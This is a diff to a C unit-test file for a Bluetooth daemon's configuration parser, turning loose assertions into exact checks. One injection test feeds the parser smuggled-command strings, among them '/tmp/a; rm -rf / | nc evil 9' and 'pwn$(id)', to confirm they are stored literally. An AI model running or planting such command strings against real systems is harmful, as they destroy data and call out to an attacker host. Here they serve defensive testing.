@@ -106,12 +106,19 @@ ATF_TC_BODY(test_cfgn_unbalanced_brace, tc)
 {
 	struct blued_config cfg;
 
-	/* Missing closing brace */
-	(void)load_text(&cfg,
+	/*
+	 * Missing closing brace.  An unmatched open brace is a hard UCL
+	 * syntax error, so blued_config_load() must reject it (-1) *before*
+	 * config_parse_root() runs and must not partially apply the
+	 * loglevel/bonddb it did manage to lex.  Assert the exact contract,
+	 * not merely "the struct stayed sane".
+	 */
+	ATF_CHECK_EQ(load_text(&cfg,
 	    "general {\n"
 	    "  loglevel = 3;\n"
-	    "  bonddb = \"/tmp/x\";\n");
-	/* Either rejected (-1) or defaults kept — struct must be sane. */
+	    "  bonddb = \"/tmp/x\";\n"), -1);
+	ATF_CHECK_EQ(cfg.loglevel, 0);
+	ATF_CHECK_STREQ(cfg.bonddb, BLUED_BONDDB_DEFAULT);
 	check_sane(&cfg);
 }
 
@@ -120,11 +127,13 @@ ATF_TC_BODY(test_cfgn_garbage_bytes, tc)
 {
 	struct blued_config cfg;
 
-	(void)load_text(&cfg,
-	    "\x01\x02 not = = = valid {{{ ][ ;;; \xff\xfe garbage\n");
+	/* Non-UCL byte soup is a parse error: rejected with -1. */
+	ATF_CHECK_EQ(load_text(&cfg,
+	    "\x01\x02 not = = = valid {{{ ][ ;;; \xff\xfe garbage\n"), -1);
 	check_sane(&cfg);
 
-	(void)load_text(&cfg, "}}}}}}}}}}\n");
+	/* Unmatched closing braces are likewise a parse error. */
+	ATF_CHECK_EQ(load_text(&cfg, "}}}}}}}}}}\n"), -1);
 	check_sane(&cfg);
 }
 
@@ -166,12 +175,29 @@ ATF_TC_BODY(test_cfgn_wrong_section_types, tc)
 {
 	struct blued_config cfg;
 
-	/* Sections given non-object values — must be ignored */
-	(void)load_text(&cfg,
+	/*
+	 * Sections given non-object values.  This is well-formed UCL, so the
+	 * load succeeds (0); config_parse_root() gates every section on
+	 * ucl_object_type(obj) == UCL_OBJECT (and devices additionally on
+	 * UCL_ARRAY), so each scalar must be ignored and the *specific*
+	 * defaults must survive verbatim — not merely stay in bounds.
+	 */
+	ATF_CHECK_EQ(load_text(&cfg,
 	    "general = \"nope\";\n"
 	    "features = 42;\n"
 	    "security = true;\n"
-	    "devices = \"none\";\n");
+	    "devices = \"none\";\n"), 0);
+	ATF_CHECK_EQ(cfg.loglevel, 0);
+	ATF_CHECK_STREQ(cfg.pidfile, BLUED_PIDFILE_DEFAULT);
+	ATF_CHECK_STREQ(cfg.bonddb, BLUED_BONDDB_DEFAULT);
+	ATF_CHECK_STREQ(cfg.ctlsock, BLUED_CTLSOCK_DEFAULT);
+	ATF_CHECK_STREQ(cfg.peripheral_name, "FreeBSD-BLE");
+	ATF_CHECK_EQ(cfg.rpa_timeout, BLUED_RPA_TIMEOUT_DEFAULT);
+	ATF_CHECK_EQ(cfg.min_key_size, BLUED_MIN_KEY_SIZE_DEFAULT);
+	ATF_CHECK_EQ(cfg.reconnect_max_delay, BLUED_RECONNECT_MAX_DEFAULT);
+	ATF_CHECK_EQ(cfg.ndevices, 0);
+	ATF_CHECK_EQ(cfg.nservices, 0);
+	ATF_CHECK_EQ(cfg.nadapters, 0);
 	check_sane(&cfg);
 }
 
@@ -291,8 +317,15 @@ ATF_TC_BODY(test_cfgn_devices_overflow, tc)
 
 	ret = load_text(&cfg, buf);
 	ATF_CHECK_EQ(ret, 0);
-	ATF_CHECK_MSG(cfg.ndevices <= BLUED_MAX_DEVICES,
-	    "ndevices=%d exceeds max %d", cfg.ndevices, BLUED_MAX_DEVICES);
+	/*
+	 * 40 distinct valid addresses are offered and the cap is exact:
+	 * config_parse_devices() breaks at BLUED_MAX_DEVICES, so the parser
+	 * must store exactly 16 — not fewer (which would mean entries were
+	 * silently dropped) and not more (an overflow).
+	 */
+	ATF_CHECK_EQ_MSG(cfg.ndevices, BLUED_MAX_DEVICES,
+	    "ndevices=%d, expected exactly %d", cfg.ndevices,
+	    BLUED_MAX_DEVICES);
 	check_sane(&cfg);
 }
 
@@ -314,8 +347,9 @@ ATF_TC_BODY(test_cfgn_services_overflow, tc)
 
 	ret = load_text(&cfg, buf);
 	ATF_CHECK_EQ(ret, 0);
-	ATF_CHECK_MSG(cfg.nservices <= BLUED_MAX_CONF_SERVICES,
-	    "nservices=%d exceeds max %d", cfg.nservices,
+	/* 20 named services offered, cap is exact: expect exactly 8 stored. */
+	ATF_CHECK_EQ_MSG(cfg.nservices, BLUED_MAX_CONF_SERVICES,
+	    "nservices=%d, expected exactly %d", cfg.nservices,
 	    BLUED_MAX_CONF_SERVICES);
 	check_sane(&cfg);
 }
@@ -339,8 +373,18 @@ ATF_TC_BODY(test_cfgn_adapters_overflow, tc)
 
 	ret = load_text(&cfg, buf);
 	ATF_CHECK_EQ(ret, 0);
-	ATF_CHECK_MSG(cfg.nadapters <= maxa,
-	    "nadapters=%d exceeds max %d", cfg.nadapters, maxa);
+	/*
+	 * 100 adapter names offered; config_parse_root()'s array arm breaks at
+	 * nitems(cfg->adapters), so the stored count must be exactly the
+	 * capacity (8).  An "<= maxa" bound is satisfied by the zeroed
+	 * default and would not notice the whole array arm regressing.
+	 */
+	ATF_CHECK_EQ_MSG(cfg.nadapters, maxa,
+	    "nadapters=%d, expected exactly %d", cfg.nadapters, maxa);
+	ATF_CHECK_EQ(maxa, 8);
+	/* And the retained entries are the first 8 offered, in order. */
+	ATF_CHECK_STREQ(cfg.adapters[0], "ubt0");
+	ATF_CHECK_STREQ(cfg.adapters[maxa - 1], "ubt7");
 	check_sane(&cfg);
 }
 
@@ -365,10 +409,17 @@ ATF_TC_BODY(test_cfgn_chars_overflow, tc)
 
 	ret = load_text(&cfg, buf);
 	ATF_CHECK_EQ(ret, 0);
-	if (cfg.nservices > 0)
-		ATF_CHECK_MSG(cfg.services[0].nchars <= BLUED_MAX_CONF_CHARS,
-		    "nchars=%d exceeds max %d", cfg.services[0].nchars,
-		    BLUED_MAX_CONF_CHARS);
+	/*
+	 * The service itself must parse (the old "if (cfg.nservices > 0)"
+	 * guard skipped the whole assertion whenever service parsing
+	 * regressed), and 20 offered characteristics must be capped at
+	 * exactly BLUED_MAX_CONF_CHARS by config_parse_characteristic().
+	 */
+	ATF_REQUIRE_EQ_MSG(cfg.nservices, 1,
+	    "nservices=%d, expected exactly 1", cfg.nservices);
+	ATF_CHECK_EQ_MSG(cfg.services[0].nchars, BLUED_MAX_CONF_CHARS,
+	    "nchars=%d, expected exactly %d", cfg.services[0].nchars,
+	    BLUED_MAX_CONF_CHARS);
 	check_sane(&cfg);
 }
 
@@ -449,7 +500,14 @@ ATF_TC_BODY(test_cfgn_string_injection, tc)
 	    "  pidfile = \"/tmp/a; rm -rf / | nc evil 9\";\n"
 	    "  peripheral_name = \"pwn$(id)\\ttab\";\n"
 	    "}\n"), 0);
-	ATF_CHECK(strstr(cfg.pidfile, "rm -rf") != NULL);
+	/*
+	 * Exact match, not a substring probe: a substring test still passes
+	 * if the surrounding text were mangled or truncated.  Both injected
+	 * strings must arrive byte-for-byte (UCL decodes the \t escape to a
+	 * literal tab; config.c copies with strlcpy and interprets nothing).
+	 */
+	ATF_CHECK_STREQ(cfg.pidfile, "/tmp/a; rm -rf / | nc evil 9");
+	ATF_CHECK_STREQ(cfg.peripheral_name, "pwn$(id)\ttab");
 	check_sane(&cfg);
 }
 
@@ -513,9 +571,7 @@ ATF_TC_BODY(test_cfgn_deep_nesting, tc)
 	buf = malloc(cap);
 	ATF_REQUIRE(buf != NULL);
 
-	/* Deeply nested objects under an unknown key.  The parser may
-	 * reject this (recursion limit) or accept it — either way it must
-	 * not crash and cfg must stay sane. */
+	/* Deeply nested objects under an unknown key. */
 	off = 0;
 	for (i = 0; i < depth && off < cap - 8; i++)
 		off += (size_t)snprintf(buf + off, cap - off, "k { ");
@@ -523,7 +579,21 @@ ATF_TC_BODY(test_cfgn_deep_nesting, tc)
 		off += (size_t)snprintf(buf + off, cap - off, "} ");
 	buf[off] = '\0';
 
-	(void)load_text(&cfg, buf);
+	/*
+	 * UCL accepts this depth without recursing to death, so the load
+	 * succeeds; "k" is not a section config_parse_root() knows, so every
+	 * default must survive untouched.  Pinning both the return value and
+	 * the specific defaults keeps this a real test: "(void)load_text(...)"
+	 * followed by check_sane() held no matter what the parser did — it
+	 * could have half-applied a section, or failed, and still passed.
+	 */
+	ATF_CHECK_EQ(load_text(&cfg, buf), 0);
+	ATF_CHECK_EQ(cfg.loglevel, 0);
+	ATF_CHECK_STREQ(cfg.pidfile, BLUED_PIDFILE_DEFAULT);
+	ATF_CHECK_STREQ(cfg.bonddb, BLUED_BONDDB_DEFAULT);
+	ATF_CHECK_EQ(cfg.rpa_timeout, BLUED_RPA_TIMEOUT_DEFAULT);
+	ATF_CHECK_EQ(cfg.ndevices, 0);
+	ATF_CHECK_EQ(cfg.nservices, 0);
 	check_sane(&cfg);
 
 	free(buf);
@@ -598,8 +668,14 @@ ATF_TC_BODY(test_cfgn_load_fd_garbage, tc)
 	ATF_REQUIRE(write(fd, text, strlen(text)) == (ssize_t)strlen(text));
 
 	blued_config_defaults(&cfg);
-	/* Parse error -> -1; either way defaults must remain sane */
-	(void)blued_config_load_fd(&cfg, fd);
+	/*
+	 * A UCL syntax error on the SIGHUP-reload path must be reported as
+	 * -1 so the daemon keeps its running configuration; the caller's cfg
+	 * is left exactly as blued_config_defaults() set it.
+	 */
+	ATF_CHECK_EQ(blued_config_load_fd(&cfg, fd), -1);
+	ATF_CHECK_EQ(cfg.loglevel, 0);
+	ATF_CHECK_STREQ(cfg.pidfile, BLUED_PIDFILE_DEFAULT);
 	check_sane(&cfg);
 
 	close(fd);
